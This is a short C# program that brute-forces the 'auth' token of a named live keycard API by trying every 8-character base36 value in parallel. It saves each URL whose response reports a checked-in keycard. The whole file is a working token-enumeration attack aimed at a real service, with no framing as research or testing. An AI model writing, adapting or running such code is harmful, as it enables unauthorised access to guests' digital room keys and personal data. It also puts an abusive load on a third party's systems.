using System.Net;
using System.Text.Json;

namespace M11;

public class Program
{
    private static string BaseQueryParameter = "?auth=";
    private static string BaseAddress = "https://api.ensoconnect.com/prod/keycard";
    private static string FilePath = "results.cs.txt";

    private static long Size = 2_821_109_907_456;

    public static int Main(string[] args)
    {
        Utils.CreateFile(FilePath);

        Parallel.For(0, Size,
            (j) =>
            {
                using var client = new HttpClient();
                client.BaseAddress = new Uri(BaseAddress);

                var queryValue = Utils.ConvertToBase36(j);

                var queryParameter = GetQueryParameter(queryValue);
                var url = $"{BaseAddress}{queryParameter}";

                var response = client.GetAsync(queryParameter).GetAwaiter().GetResult();

                if (response.StatusCode != HttpStatusCode.OK)
                {
                    Console.WriteLine($"Finished executing {url}");

                    return;
                }

                var body = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                var keyCard = JsonSerializer.Deserialize<KeyCard>(body);

                if (keyCard is null || keyCard.View != "checked_in") {
                    Console.WriteLine($"Finished executing {url}");

                    return;
                }

                Console.WriteLine($"{url} is good! And value is {keyCard.View}");
                File.AppendAllText(FilePath, $"{url}\n");
            });

        return 0;
    }

    private static string GetQueryParameter(string input)
    {
        return $"{BaseQueryParameter}{input}";
    }
}
